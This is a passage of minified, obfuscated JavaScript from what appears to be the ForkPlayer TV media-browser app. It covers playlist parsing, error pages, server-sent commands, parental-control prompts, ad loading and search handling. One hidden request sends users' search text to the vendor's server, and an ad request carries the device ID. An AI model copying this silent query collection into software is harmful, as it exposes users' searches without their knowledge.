if(c.URL_REQUEST.indexOf("http://"+getip("acestream")+"/server/api")===0){data=ll1O0l1IlglOO010Ypr(s,c.URL_REQUEST);c.typeSource="acestream"}else if(s.indexOf("<track>")>0&&s.indexOf('<location>')>0){data=parsexspf(s);c.typeSource="xspf"}else{data=l0OIIlIIlONuu1111Ypr(s);if(data==null){var s1=s.replace(/[\r\n]/g,"").match(/^(.*?)([\{\[].*[\}\]])/);if(s1){if(s1[1])kjtYpr.inf(s1[1],600);data=l0OIIlIIlONuu1111Ypr(s1[2])}}
if(data)c.typeSource="fxml";else if(xml_url.indexOf(".txt")>0){data={channels:l1Il110z0S1OI0I1Ypr(s)};c.typeSource="txt"}}
if(pq.lII1I1lOll0gr0IIOlYpr=="selfReNewBookmark"){try{for(var i=0;i<data.channels.length;i++)if(data.channels[i].title==sel){curCh("stream_url",data.channels[i].stream_url);curCh()["parser"]="";if(orig_xml_url)play_mini(curCh("stream_url"));else kjtYpr.l11II0OI1JuTullll0Ypr(lIllO0Imlel1IlI1Ypr);return}}catch(e){selfpages[xml_url]=null;kjtYpr.inf("Ошибка получения ссылки с плейлиста, возможно он сейчас недоступен!",1500)}
selfpages[xml_url]=null;kjtYpr.inf(sel+" не найден в плейлисте!",1500);return}
if(!data){if(c.llIl1100glLO10l1Ypr)data={};else{c.ERR=404;data={"title":c.lII1I1PVBuI1lIlYpr,"before":"<div style='margin-top:30px;margin-left:200px;text-align:left;'><img style='margin-left: -20px;' width='90' src='"+icoerr+"' /><div style='font-weight:bold;font-size:120%;'>Не удается отобразить страницу</div>Проверьте, нет ли опечаток в адресе <span style='font-size:80%;'>"+c.lII1I1PVBuI1lIlYpr+"</span><br>"+(s!=""?"Исходный код ответа: <br><div style='font-style: italic;margin: 5px;padding: 3px;max-height:110px;overflow-x:hidden;overflow-y:scroll;'><small>"+escapeHtml(s.substr(0,280))+"</small></div>":"")+"<br>Если все правильно, проверьте сеть Интернет или посмотрите в новостях - может сайт сейчас недоступен или на тех. работах<br><br></div>","typeList":"start","channels":[]};data.channels.push({"logo_30x30":"none","position":"hlink","title":"Назад","playlist_url":"cmd:historyback(1);"});data.channels.push({"logo_30x30":"none","position":"hlink","title":"Перезагрузить","playlist_url":c.lII1I1PVBuI1lIlYpr,"description":xml_url+"<br>Нажмите, чтобы открыть ссылку<br> Или нажмите Меню / Добавить в закладки (стартовое меню), чтобы сохранить"});if(s.match(/(<html|<body)/))data.channels.push({"logo_30x30":"none","position":"hlink","title":"Открыть как HTML","playlist_url":xml_url,"local":"html"});data.channels.push({"logo_30x30":"none","position":"hlink","title":"Открыть анонимно","playlist_url":xml_url,"local":"direct"});data.channels.push({"logo_30x30":"none","position":"hlink","title":"Открыть через RemoteFork","description":"RemoteFork link<br>_FPNeobhodimRemoteFork_","playlist_url":"http://"+maJor.params.get("remoteip")+"/parserlink?"+encodeURIComponent(xml_url),"local":"direct"});data.icon="err"}
if(pl_serv<pl_count-1){pl_serv++}}
pq.data=data;c.toChannels(pq)}catch(e){xhr=null;kjtYpr.inf("_FPOshibkaObrabotki_:"+e,3000);if(e.toString().toLowerCase().indexOf("quota")!=-1){llI111O0hn01IO1QIYpr()}
c.toChannels(pq)}},l11l00IIjOd10IIOYpr:function(p){var c=this;POST_S="";if(c.l0IOOl1l01azgIl01lOYpr!=null){delete c.l0IOOl1l01azgIl01lOYpr}else{}
if(c.canceled){return}
var ch=p.ch;var tag=p.tag;var pars=ch[tag].split("|");pars[0]=gV(pars,0);pars[1]=gV(pars,1);pars[2]=gV(pars,2);var link=gV(pars,0);if(gV(pars,1)=="selfReNewBookmark"){if(gV(selfpages,link)!=""){statusbar("from cache "+pars[0],"link");c.oncomplete(selfpages[link],link,"selfReNewBookmark");return}}
if(is_parse_self(link,gV(l11I101vQBOw0llIYpr.page,"lII1I1PVBuI1lIlYpr"))||pars[1]=="selfReNewBookmark"||gV(ch,"addparserident")==1)
link=maJor.addident(link);c.l0IOOl1l01azgIl01lOYpr=uHelper.create("direct|rf");c.l0IOOl1l01azgIl01lOYpr.parse=function(s){statusbar("off");if(s==null){if(!c.l0IOOl1l01azgIl01lOYpr.is_remote()){kjtYpr.inf("_FPUse RemoteFork for parse this link_!",1500);maJor.Remote.init()}
if(tag.indexOf("mb")!=0)return;else s=""}
if(s==""&&tag.indexOf("mb")!=0){kjtYpr.inf("Пустая ссылка "+tag+"!",1500);if(handler=="player")vPlayer.lIOQ0lI1iZm1hQ1O0Ypr()}else{text=c.parserstr(pars,s);if(ch.playlist_url){if(ch.playlist_url.indexOf("=postmd5")>0){ch.postmd5=text;text="postmd5"}else if(text.length>9000&&ch.playlist_url.indexOf("#POST")==-1)kjtYpr.inf("Слишком длинный параметр GET, замените его на POST в случае ошибки обработки страницы!",1500);ch.playlist_url=ch.playlist_url.replace("md5orighash",text);if(tag.indexOf("mb")==0)ch.playlist_url=ch.playlist_url.replace("md5mbhash",encodeURIComponent(text));else ch.playlist_url=ch.playlist_url.replace("md5hash",encodeURIComponent(text))}
if(ch.stream_url){if(ch.stream_url.indexOf("=postmd5")>0){ch.postmd5=text;text="postmd5"}else if(text.length>9000)kjtYpr.inf("Слишком длинный параметр GET, замените его на POST в случае ошибки обработки ссылки!",1500);if(tag.indexOf("mb")==0)ch.stream_url=ch.stream_url.replace("md5mbhash",text);else ch.stream_url=ch.stream_url.replace("md5hash",text)}
ch[tag]="";var a_pq=p.pq;a_pq.elCh=ch;p.callback(a_pq)}}
c.l0IOOl1l01azgIl01lOYpr.get(link)},parserstr:function(pars,s){var x1=-1,x2=-1;if(pars[2]==""&&pars[1]=="")var text=s;else if(pars[1]=="RegExp"||pars[1]=="regexp"){s=s.replace(/\n/g,"").replace(/\r/g,"");try{regexp=new RegExp(pars[2],(pars[3]||""));items=regexp.exec(s);var ind=parseInt(pars[4])||0;if(isNaN(ind))ind=0;text=items[ind]}catch(e){TVXInteractionPlugin.error("Parse RegExp error "+lParams.parser+" failed: "+e.message)}}else if(pars[1].indexOf(".*?")>=0||pars[2].indexOf(".*?")>=0){s=s.replace(/\n/g,"").replace(/\r/g,"");try{pg=pars[1]+'(.*?)'+pars[2];regexp=new RegExp(pg,"i");items=regexp.exec(s);text=items[1]}catch(e){TVXInteractionPlugin.error("RegExp Parse error "+lParams.parser+" failed: "+e.message)}}else{x1=(pars[1]=="")?0:s.indexOf(pars[1]);if(x1>-1)x1+=pars[1].length;else return"";x2=(pars[2]=="")?-2:s.indexOf(pars[2],x1);if(x2==-2)text=s.substr(x1);else if(x2==-1)return"";else text=s.substr(x1,x2-x1)}
return text},is_show_rek:function(){rek_last=rek_last||maJor.read("rek")||0;if(rek_q>9)return 0;if(rek_num>0)return 0;if(T.inetTime-rek_last>rek_interval&&is_white()){return 1}
return 0},adv:function(pq){var c=this;if(!c.is_show_rek()||!elCh.stream_url||maJor.timestamp>=3)return 0;else{vPlayer.lIOQ0lI1iZm1hQ1O0Ypr();handler="player";is_rek=!0;pstream=!1;vPlayer.paused=!1;lO1l0Ql0lpNwI01OOYpr('https://ssp.bidvol.com/vast/pl23611?bundle=com.forknew.beta&storeurl='+encodeURIComponent(gP("lII1I1PVBuI1lIlYpr"))+'&appname=forknewbeta&w='+maJor.screen().w+'&h='+maJor.screen().h+'&ifa=123e4567-e89b-12d3-a456-'+maJor.getId(),"","start");statusbar("LOAD AD "+rek_q);vPlayer.rekLife();rek_mode=pq.mode;rek_q++;rek_last=T.inetTime;maJor.write("rek",T.inetTime);rek_type="bidvol";return 1}},dataconfirm:null,handlerData:function(pq){var c=this;try{var data=pq.data||{};var curPage=gP();var orig_xml_url=c.lII1I1PVBuI1lIlYpr;if(data.setcookie){var dm=orig_xml_url.match(rCook);if(dm!=null){dm=dm[3]}else dm="localhost";for(var i in data.setcookie){if(!maJor.llIO1lQ1SXSlO111Ypr[dm])maJor.llIO1lQ1SXSlO111Ypr[dm]={};maJor.llIO1lQ1SXSlO111Ypr[dm][i]=data.setcookie[i]}
if(!IlO11lQ0("is_private"))maJor.write("storage",ll1lI1lI0sl0OlIYpr(maJor.llIO1lQ1SXSlO111Ypr),!0)}
if(gV(pq.elCh,"filter")!=""&&$_("vk").style.display!="none"&&gV(data,"cmd").indexOf("stop()")==-1)VK.close(1);if(data.confirm){var dm=orig_xml_url.match(rCook);var ttl=gV(data.confirm,"title");if(dm!=null)ttl="<div style='font-weight: bold;background: #3b3e40;'>"+dm[3]+"</div>"+ttl;confirmed.create(ttl);confirmed.fun0=function(){IlO11lQ0().navigate(data.confirm.channel)};return 1}
if(gV(data,"info")!==""){var dm=orig_xml_url.match(rCook);if(dm!=null){data.info="<div style='font-weight: bold;background: #3b3e40;'>"+dm[3]+"</div>"+data.info}
confirmed.create(data.info)}
if(data.notify){var dm=orig_xml_url.match(rCook);if(dm!=null){data.notify=dm[3]+":"+data.notify}
kjtYpr.inf(data.notify,2200)}
if(gV(data.cmd)!=""){var brea=0;if(data.cmd.indexOf("setEpg")==0){fEpg.set_epg(data.cmd);return 1}
if(data.cmd.indexOf("updateLogin(")>=0){maJor.updateLogin()}
if(data.cmd.indexOf("setID(")>=0){var m=data.cmd.match(/setID\((.*?),(.*?)\)/);if(m==null)kjtYpr.inf("Error format setID. Must be setID(newID,userSignature)",1500);else if(!maJor.user)kjtYpr.inf("Error setID. Must be logged in ForkPlayer",1500);else if(maJor.user.md5!=m[2])kjtYpr.inf("Error userSignature setID",1500);else{kjtYpr.nmc=m[1];confirmed.create("Внимание! Если идентификатор "+kjtYpr.nmc+" все еще используется на каком-то другом устройстве то оно может потерять доступ к приложению. <br> Сменить идентификатор этого устройства на "+kjtYpr.nmc,"_FPAre you sure_?").fun0=function(){if(kjtYpr.nmc.length==12||kjtYpr.nmc.length==14){maJor.writeC("oID",maJor.getId());maJor.write("oID",maJor.getId());maJor.writeC("ID",kjtYpr.nmc);maJor.write("ID",kjtYpr.nmc);maJor.writeC("ID",kjtYpr.nmc);maJor.ID=kjtYpr.serial=kjtYpr.nmc;kjtYpr.inf("OK set ID "+maJor.getId(),2200);maJor.updateLogin();IlO11lQ0().reload()}else kjtYpr.inf("Error format ID",1500)}}
return 1}
if(data.cmd.indexOf("historyclear(")>=0){var m=data.cmd.match(/historyclear\((.*?),(.*?)\)/);if(m==null)kjtYpr.inf("Error format historyclear. Must be historyclear(days,userSignature)",1500);else if(!maJor.user)kjtYpr.inf("Error historyclear. Must be logged in ForkPlayer",1500);else if(maJor.user.md5!=m[2])kjtYpr.inf("Error userSignature historyclear",1500);else{if(m[1]==-1)lOO1IIlwlIl0l1lYpr=[];else{var nh=[];for(var i in lOO1IIlwlIl0l1lYpr){if(lOO1IIlwlIl0l1lYpr[i].time<T.timestamp-3600*24*m[1])nh.push(lOO1IIlwlIl0l1lYpr[i])}
lOO1IIlwlIl0l1lYpr=nh;maJor.write("history",ll1lI1lI0sl0OlIYpr(lOO1IIlwlIl0l1lYpr))}}}
if(data.cmd.indexOf("historyback(")>=0){var m=data.cmd.match(/historyback\((.*?)\)/)[1];if(m>0)m*=-1;m--;c.l11I101vQBOw0llIYpr.navigateHist(m,data.cmd.indexOf("reload(")>=0);return 1}
if(data.cmd.indexOf("setfon(")>=0){var m=data.cmd.match(/setfon\((.*?)\)/)[1];if(m==-1)var pqm=confirmed.create("Это может улучшить отклик перемещения курсора","Отключить фоновые изображения страниц?");else pqm=confirmed.create("<img style='height:360px;' src='"+getFon(m)+"' />","Change default background image to");pqm.fun0=function(){maJor.params.set("fon",m);c.ll00IOO11EVII1IYpr(pq)};return 1}
if(data.cmd.indexOf("info(")>=0){var m=data.cmd.match(/info\((.*?)\)/)[1];confirmed.create(m,c.l11I101vQBOw0llIYpr.page.XML_DOMAIN,"OK");return 1}
if(data.cmd.indexOf("removeHist(")>=0){var m=data.cmd.match(/removeHist\((.*?)\)/)[1]}
if(data.cmd.indexOf("replacepage(")>=0){var m=data.cmd.match(/replacepage\((.*?)\)/);curPage.global=c.global;curPage.channels=data.channels;curPage.renderChannels(getSelect(),"update");return 1}
if(data.cmd.indexOf("settitle(")>=0){var m=data.cmd.match(/settitle\((.*?),(.*?)\)/);curPage.channels[m[1]].title=m[2];curPage.renderChannels(getSelect(),"update")}
if(data.cmd.indexOf("setdescription(")>=0){var m=data.cmd.match(/setdescription\((.*?),(.*?)\);/);curPage.channels[m[1]].description=m[2];curPage.renderChannels(getSelect(),"update")}
if(data.cmd.indexOf("reload(")>=0){var m=data.cmd.match(/reload\((.*?)\)/)[1];if(m!=""&&m>0){var xt=c.lII1I1PVBuI1lIlYpr;setTimeout(function(){if(xt==c.lII1I1PVBuI1lIlYpr){c.l11I101vQBOw0llIYpr.reload()}},1000*m)}else{c.l11I101vQBOw0llIYpr.reload()}
return 1}
if(data.cmd.indexOf("stop()")>=0){return 1}
if(brea)return 1}
if(data.error){is_loadpage(0);kjtYpr.inf(data.error,2200);return 1}}catch(e){kjtYpr.popUp("Error data<br>"+e.message,2200)}
return 0},showParrent:function(v){var c=this;if(maJor.params.get('passwordkey')=="0000")kjtYpr.popUp("<img width='35' height='35' src='"+_img("_ST_important.png")+"' style='float:left;padding-right:5px;' /><span style=\"font-size:120%\"><b> _FPParol_ _FPpoumolch_ 0000<b></span><br><i>_FPSmIotk_ _FPparol_ _FPmoV_ <span style='background-color:red;font-size:10px;'>&nbsp;&nbsp;&nbsp;</span> _FPMenu_ -> _FPNastroiki_ -> _FPRodKontr_</i>");VK.open({search_on:"_FPDlDostVv_ _FPparol_:",inputId:"unlockpass",type:"password",el:v,oncomplete:function(c){if(c.str=='')return;else if(maJor.params.get('passwordkey')==c.str){kjtYpr.Password=c.str;kjtYpr.inf("_FPDostupRazreshen_!",1000);c.close();IlO11lQ0().navigate(c.pq.el);if(kjtYpr.Password=="0000")kjtYpr.popUp("<b><i>_FPVineSmP_</i></b>");else kjtYpr.popUp("<i>_FPParolDeistDk_</i>")}else{kjtYpr.inf("_FPParol_ _FPnePodhodit_!",1000)}
return}})},preOpen:function(pq){var c=this;if(c.detChxxx(pq.elCh)){c.showParrent(pq.elCh);return 1}
if($_(VK.id)==null&&maJor.params.get("third")==0&&(0||pq.elCh.playlist_url.indexOf("searchEngines")==0)&&templic==0&&pq.inputed==null){confirmed.create("Поиск в Интернет может вести на сторонние сайты и плейлисты, нажимая _FPProdolzhit_, вы подтверждаете что несёте ответственность за принятие решений о получении доступа к сторонним сайтам к результатам поиска","Внимание!","Больше не показывать|_FPProdolzhit_");confirmed.fun0=function(){maJor.params.set("third",2);pq.l11I101vQBOw0llIYpr.play()};confirmed.fun1=function(){templic=1;pq.l11I101vQBOw0llIYpr.play()}
return 1}
templic=0;var xml_url=pq.elCh.playlist_url;if(xml_url=="menu"){kjtYpr.llI0IOruD0IOI1IYpr("onlymenu");return 1}else if(xml_url=="confirm"){if(gV(pq.elCh,"description")=="")var ttl=pq.elCh.title;else ttl=pq.elCh.description;confirmed.create(ttl);confirmed.fun0=function(){var el=l0OIIlIIlONuu1111Ypr(ll1lI1lI0sl0OlIYpr(pq.elCh));el.playlist_url=pq.elCh.confirm[0];IlO11lQ0().navigate(el)};return 1}else if(xml_url=="cmdSetSync"){c.l11I101vQBOw0llIYpr.navigateHist(-2);return 1}else if(xml_url=="cmdSetSyncImp"){is_loadpage(1);maJor.remoteData.get("http://cloudflare.appfxml.com/browseraccount/?do=fimport&rev=4&&v="+pq.elCh.menu_url,c);return 1}
if(xml_url.match(/^searchEngines(#url|xml)?\|/)){var xc=xml_url.split("|");xml_url=xc[0];pq.inputed={"text":xc[1],"id":""}}
if(pq.elCh.search_on!=""&&pq.inputed==null){if(pq.elCh.search_on=="search"||pq.elCh.search_on=="search_on")pq.elCh.search_on="_FPVvediteText_";VK.open({el:pq.elCh});return 1}
if(xml_url.indexOf("searchEngines")==0&&pq.inputed){if(pq.inputed.text=="")return 1;spider_stat=pq.inputed.text;if(pq.inputed.text.match(/^(http|about:|tosettings|cmd|vk:|www\.|html:\/\/)/)||pq.elCh.playlist_url.indexOf("searchEngines#url")==0){xml_url="cmdEnterlist"}else{se=getVars("start").search;ch=[];function _rds(el){return{"logo_30x30":el.logo,"timeout":10,"position":"list","title":el.title,"iframe":"3","playlist_url":el.url.replace("%s",encodeURIComponent(pq.inputed.text))}}
for(var i=0;i<se.sites.length;i++){if(gV(se.sites[i],"dop")==2)ch.unshift(_rds(se.sites[i]));else if(gV(se.sites[i],"dop"))ch.push(_rds(se.sites[i]))}
if(ch.length==0){is_loadpage(-1);kjtYpr.inf("Нужно сначала _FPAdd a search engine_ в настройках!",1500)}else{c.lII1I1PVBuI1lIlYpr=c.SAVE_lII1I1PVBuI1lIlYpr=xml_url+"|"+pq.inputed.text+"|"+ch[0].playlist_url;pq.data={"title":"Поиск "+pq.inputed.text,"channels":ch};c.toChannels(pq);uHelper.create("directnoheader").hid().getI("http://browser.appfxml.com/gstatic.php?id=spiders#POSTs="+encodeURIComponent(pq.inputed.text))}
return 1}}
if(xml_url.indexOf("cmdEnterlist")==0){if(pq.inputed.text=="")return 1;pq.elCh.type="enterurl";pq.elCh.title=pq.inputed.text;xml_url=pq.inputed.text;if(xml_url.indexOf("//")>0&&xml_url.indexOf("?")==-1&&xml_url.lastIndexOf("/")!=xml_url.length-1&&!xml_url.match(/\/\/.*\//))xml_url+="/";var ttl=xml_url.replace(/^https?:\/\//,"");if(ttl.indexOf("?")>0)ttl=ttl.substring(0,ttl.indexOf("?"));pq.data={"title":ttl,"icon":_img("_ST_emptydoc.png"),"channels":[{"location":kjtYpr.applyenter,"type":"enterurl","title":ttl+"","playlist_url":xml_url}]};c.lII1I1PVBuI1lIlYpr=c.SAVE_lII1I1PVBuI1lIlYpr=xml_url;c.toChannels(pq);return 1}
kjtYpr.lastchannels=null;if(c.lII1I1PVBuI1lIlYpr.indexOf("#submenu")>0&&gV(pq.elCh,"type")=="replace"){kjtYpr.lastchannels=c.channels;var n=pq.l11I101vQBOw0llIYpr.get("s",-2);pq.l11I101vQBOw0llIYpr.history.pop();var t=pq.l11I101vQBOw0llIYpr.get("title");pq.l11I101vQBOw0llIYpr.history.pop();if(pq.inputed)pq.elCh.title=t+"["+n+"="+pq.inputed.text+"]";else pq.elCh.title=t+"["+n+"="+pq.elCh.title+"]"}
if(pq.inputed){if(kjtYpr.hardware=="UE32J4500"||!0)pq.inputed.text=parseHtmlEnteties(pq.inputed.text);kjtYpr.lastSearch=pq.inputed.text}
c.REQUEST_XML=xml_url;c.SEARCH_TEMPL=""},getTypePos:function(Ch,index){if(index==null)index=1;if(index>=0){var P=gV(Ch,"position");if(P==""){if(gV(Ch,"tvg-shift")=="99")P="fulleditline";else if(gV(Ch,"tvg-shift")=="98")P="hlink"}
if(P==""&&gV(Ch,"template")!="")P="html"
else if(P=="")P=this.typeList||""}else P="";return P},upPos:function(){var c=this;c.sPos={}
c.sPosX=0;c.sPosY=0;c.CAS=[];c.count=0;c.posX=0;c.posY=0},addGl:function(search_url,p,title,img){if(search_url.indexOf("http")==0){if(search_url.indexOf("%s")==-1)search_url=sU(search_url,"search=%s");var se=getVars("start").search;if(img==null)img="";if(title==null)title="";var ex=l11IOOMMvt011llOYpr(search_url);if(ex>=0){se.sites[ex].dop=1;kjtYpr.popUp(title+" уже включен в поиск! <br>Отключить можно в Меню/Настройки/Поисковые системы",2000)}else{var el={"title":title,"url":search_url,"logo":img,"dop":1};var els=se.sites.length;if(els>2)els=2;se.sites.splice(els,0,el);kjtYpr.popUp(title+" установлено вашей поисковой системой! <br>Отключить можно в Меню/Настройки/Поисковые системы",2000)}
setVars("search",se)}else kjtYpr.popUp(title+" не содержит ссылку!",2000)},addToSearchHist:function(search_url,p,title,img,pq){var c=this;var se=getVars("start").search;if(p==null)p="site";if(img==null)img="";if(title==null)title="";title=title.replace(/<.*?>/,"");var ex=l11IOOMMvt011llOYpr({"title":title,"url":search_url,"logo":img,"type":p});for(var i=0;i<se.sites.length;i++){if(se.sites[i].dop)last=i}
var t="";if(ex>=0){last++;if(last<ex&&last<se.sites.length){var old=se.sites[ex];se.sites[ex]=se.sites[last];se.sites[last]=old}
if(!se.sites[ex].dop)t="Включите поиск по этому сайту в Поисковые системы или нажмите здесь, чтобы искать по нему с адресной строки!"}else if(c.reallinks>1){if(se.sites.length<4){se.sites.splice(1,0,{"title":title,"url":search_url,"logo":img,"dop":1,"type":p});t=c.XML_DOMAIN+"<br>"+title+" включено в список _FPYour search engines_<br>Отключить или изменить можно в Настройках / Поисковые системы или нажмите сейчас здесь"}else{se.sites.splice(last+1,0,{"title":title,"url":search_url,"logo":img,"type":p});confirmed.create("Включить поиск по этому сайту?<br>"+c.XML_DOMAIN,"_FPYour search engines_","_FPEdit_|_FPEnable_|_FPLater_");confirmed.fun0=function(){OpenUrl("about:configsearch#edit:sites:"+(last+1))};confirmed.fun1=function(){se.sites[last+1].dop=1;setVars("search",se)}}}else t="Добавьте поиск по этому сайту в свои Поисковые системы, чтобы искать по нему с адресной строки!";setVars("search",se);if(!c.llIl1100glLO10l1Ypr&&t!=""){hint('<img style="float: left; margin: 2px 6px 0px 0px;width: 25px;height: 25px;background: #9e9e9e;" src="https://raw.githubusercontent.com/komivp/appinfodl/main/static/page_fav_off_white.png">'+t,"kb5")}
seSt.push({"url":search_url,"img":img,"title":title,"is_xxx":c.REQUEST_XXX,"text":"","gs":c.llIl1100glLO10l1Ypr,"count":c.channels.length,"app_cors":maJor.app_cors,"rf":(maJor.params.get("remote")>0&&maJor.params.get("remoteactive")),"acestream":(maJor.params.get("aceactive")||maJor.params.get("torrserveactive"))})},l11l0IfeO110IOYpr:function(){$_("top2").style.paddingTop=css_wh(4)+"px";$_("top2").style.height=css_wh(36)+"px";$_("top2text").style.paddingTop=css_wh(2)+"px";$_("top2text").style.marginTop=css_wh(1)+"px";$_("top2text").style.fontSize=css_wh(20)+"px";$_("top2text").style.height=css_wh(24)+"px";if(maJor.params.get("sidebar")=="1"){$_("sidebar").style.display="block";if(sdbar==null){var s=maJor.read("bookmarks");if(s!=""){var sd=l0OIIlIIlONuu1111Ypr(s);if(sd==null)sd=[];if(typeof sd.push=="undefined")sd=[];for(var i=0;i<sd.length;i++){if(sd[i].playlist_url=="bookmarks/toolbar"){sdbar=sd[i].channels;break}}}
var html=""}
if(sdbar!=null){dop="max-width:"+(($_("sidebar").offsetWidth-12-(sdbar.length*8))/sdbar.length).toFixed(0)+"px;";html="";for(var i=0;i<sdbar.length;i++){if(sdbar[i]==null)sdbar.splice(i,1);else{if(typeof sdbar[i].logo_30x30=="undefined")sdbar[i].logo_30x30=_img("_ST_emptydoc.png");if(sdbar[i].logo_30x30.indexOf("http")!=0)sdbar[i].logo_30x30=_img("_ST_emptydoc.png");html+="<div id='sdbar"+i+"' title='"+sdbar[i].title.replace(/<.*?>/g,"")+llOlI0OfCMO0l0I0Ypr(1,["' onmousemove=\"if(handler=='menu'&&(getSelect()!=-2||sdbarSel!="+i+")) {setSelect(-2);sdbarSel="+i+";linkOver();}\" onclick=\"sdbarSel="+i+";sidebar_play();\" ",""])+"style='height:18px;overflow:hidden;border: 2px solid transparent;float:left;padding:0px 3px 0px 1px; margin:0px;"+dop+"'>"+"<img onerror=\"onImgError(this,'emptydoc');\" width='20' height='16' style='float: left; padding: 0px 3px 0px 0px;' src='"+_img(sdbar[i].logo_30x30)+"' /><div style='margin-top:"+css_wh(-2)+"px;margin-left:23px;'>"+sdbar[i].title.replace(/<.*?>/g,"")+"</div></div>"}}
$_("sidebar",html)}
if(html==""){maJor.params.set("sidebar",0);if(getSelect()==-2){setSelect(-1);oInset.listInset()}
statusbar("_FPBookmark toolbar_ _FPOtkl_! _FPPustayaPapka_")}
sidebar_sel()}else{$_("sidebar").style.display="none"}},lOI0IOulTXp11OlYpr:function(index,m,d){var c=this;if(m!=null)var dop=" "+m+" "+m+"default";else dop="";var chf='<div ontouchstart="parent.t_s(event,'+index+');" class="ch default'+dop+'" id="ch'+index+'"'+gV(d)+' sel="0"'+llOlI0OfCMO0l0I0Ypr(1,[' onmousemove="if(!this.sel) parent.linkOver('+index+',this);" onmousedown="parent.p_d(this,'+index+');" onmouseup="parent.p_u();" onclick="parent.p_c('+index+');"',""]);chf+='>';return chf},renderCh:function(Ch,index,dop){var c=this;Ch.imgsrc=gV(Ch,"imgsrc");if(Ch.imgsrc==""){if(gV(Ch,"playlist_url")!="")Ch.imgsrc=_img("_ST_open.png");else Ch.imgsrc=_img("_ST_file.png")}
if(gV(Ch,"imgsrc").match(/^http:\/\/check(true|false)/)){Ch.imgsrc=_img((Ch.imgsrc=="http://checktrue"?"_ST_checktrue.png":"_ST_checkfalse.png"))}
var title=Ch.display_title||gV(Ch,"title");if(!Ch.search_on&&(title==""||title==" "))title=gV(Ch,"playlist_url").replace(/^https?:\/\//,"");title=title.toString();if(Ch.search_on&&Ch.value){var t=title.match(/(.*?:)/);if(t)title=t[1];else title="";if(gV(Ch,"type")=="password")title+=Ch.value.replace(/./g,"*");else title+=Ch.value}
if(index>0)var lastP=c.getTypePos(c.channels[index-1],(index-1));else lastP="";var l0lIO11I1ycYI1Il0lOYpr=c.getTypePos(Ch,index),addbr=0,bef="",html="";if(index>0){if(gV(Ch,"br"))addbr=1;else if(typeof Ch.br!="undefined")addbr=0;else if(typeof(Ch.coordination)=="object"){if(Ch.coordination[0]<1)addbr=1}else if(l0lIO11I1ycYI1Il0lOYpr.match(/^(label|list|fulleditline)/)||lastP!=l0lIO11I1ycYI1Il0lOYpr)addbr=1;else if(c.sPosX>=(startX-1)){addbr=1;c.chfullpage=1}
if(addbr){if(Ch.before)Ch.before=Ch.before.replace(/<br.*?>/,"");bef="<br clear=left>";c.sPosX=0;c.sPosY++}else c.sPosX++}else{c.sPosX=0;c.sPosY=0}
c.sPos[index]=[c.sPosX,c.sPosY];if(l0lIO11I1ycYI1Il0lOYpr!="list"){title=title.replace(/<img.*?>/g,"");if(l0lIO11I1ycYI1Il0lOYpr=="bigtile"){st_w=10;st_h=194}else{st_w=10;st_h=80}
el_mini=!1;el_margin=1;if(l0lIO11I1ycYI1Il0lOYpr=="label"||l0lIO11I1ycYI1Il0lOYpr=="hlink"){return bef+gV(Ch,"before")+c.lOI0IOulTXp11OlYpr(index,l0lIO11I1ycYI1Il0lOYpr)+'<img id="img'+index+'" src="'+_img("_ST_1px.png")+'" onerror=\"parent.onImgError(this);\" data-src="'+_img(Ch.imgsrc)+'" class="icon">'+'<div id="titleid'+index+'" class="title">'+title+'</div>'+'</div></div>'+gV(Ch,"after")}
if(l0lIO11I1ycYI1Il0lOYpr=="fulleditline"){return bef+gV(Ch,"before")+c.lOI0IOulTXp11OlYpr(index,l0lIO11I1ycYI1Il0lOYpr)+'<div id="titleid'+index+'" class="title">'+(Ch.imgsrc.indexOf("http")==0?'<img id="img'+index+'" src="'+_img(Ch.imgsrc)+'" class="icon">':"")+title+'</div></div>'+gV(Ch,"after")}
if(l0lIO11I1ycYI1Il0lOYpr=="html"){html+=adop+c.lOI0IOulTXp11OlYpr(index,l0lIO11I1ycYI1Il0lOYpr,dop);html+=gV(Ch,"template").replace("$title","<span class='title' id='titleid"+index+"'>"+title+"</span>").replace(/\$logo_30x30(.*?["'])/,_img("_ST_1px.png")+"$1 onerror='parent.onImgError(this);' data-src='"+Ch.imgsrc+"' class='icon' id='img"+index+"'").replace("$description",gV(Ch,"description"))}else{html+=adop+c.lOI0IOulTXp11OlYpr(index,"start",dop);html+="<div id='rat"+index+"' class='rating'></div>";if(Ch.imgsrc)html+='<img id="img'+index+'" src="'+_img("_ST_1px.png")+'" onerror=\"parent.onImgError(this);\" data-src="'+_img(Ch.imgsrc)+'" class="icon">';html+='<div class="name" id="titleid'+index+'"><div class="title">'+title+'</div> </div>';if(Ch.side_icon)if(Ch.side_icon!="")html+='<img class="side_icon" align="left" src="'+_img(Ch.side_icon)+'" style="top:-'+st_h+'px;height:'+(st_h-4)+'px;width:'+st_w+'%;">'}
html+='</div>';return bef+gV(Ch,"before")+html+gV(Ch,"after")}
if(gV(Ch,"number")!=="")var num=Ch.number;else{var num=(index+1);if(gV(c.global,"startcontent")>0&&c.lII1I1PVBuI1lIlYpr.indexOf("#submenu")==-1)num-=gV(c.global,"startcontent")}
var img='';if(typeof Ch.logo_search!="undefined")Ch.imgsrc=Ch.logo_search;if(gV(Ch,"imgsrc")=="none"||gV(Ch,"imgsrc")==""){img='<div style="float:left;width:'+Math.round(ll010Apn00lIlYpr*1.2*(css_w(100)/css_wh(100)))+'px;margin: 0px 2px;padding-right: 2px;">&nbsp;</div>'}else img='<img id="img'+index+'" class="icon" src="'+_img("_ST_1px.png")+'" onerror="parent.onImgError(this);" data-src="'+_img(Ch.imgsrc)+'" width="'+Math.round(ll010Apn00lIlYpr*1.2*(css_w(100)/css_wh(100)))+'" height="'+(ll010Apn00lIlYpr-css_wh(4))+'">';var html=c.lOI0IOulTXp11OlYpr(index,"list",dop);html+="<div class='contmenu' id='contmenu"+index+"' style='height:"+ll010Apn00lIlYpr+"px;'>"+"<img"+llOlI0OfCMO0l0I0Ypr(1,[" onclick=\"parent.kjtYpr.llI0IOruD0IOI1IYpr();\"",""])+" src='"+_img("https://raw.githubusercontent.com/komivp/appinfodl/main/static/menu_qb.png")+"' style='background: inherit;border-radius:0px 4px 4px 0px;position: absolute;height:"+ll010Apn00lIlYpr+"px;width:"+(ll010Apn00lIlYpr)+"px;' /></div>";if(Ch.imgsrc!="hidden")html+='<div id="numch'+index+'" class="numb">'+num+'</div>';html+=img;if(gV(Ch,"infolink")!=""&&Ch.infolink!=" "&&gV(Ch,"search_on")==""){var ttl='<div class="infolinktitle">'+title+'</div>'+'<div class="infolink">'+Ch.infolink+'</div>'}else ttl=title;if(Ch.stream_url=="")html+="<div id='rat"+index+"' 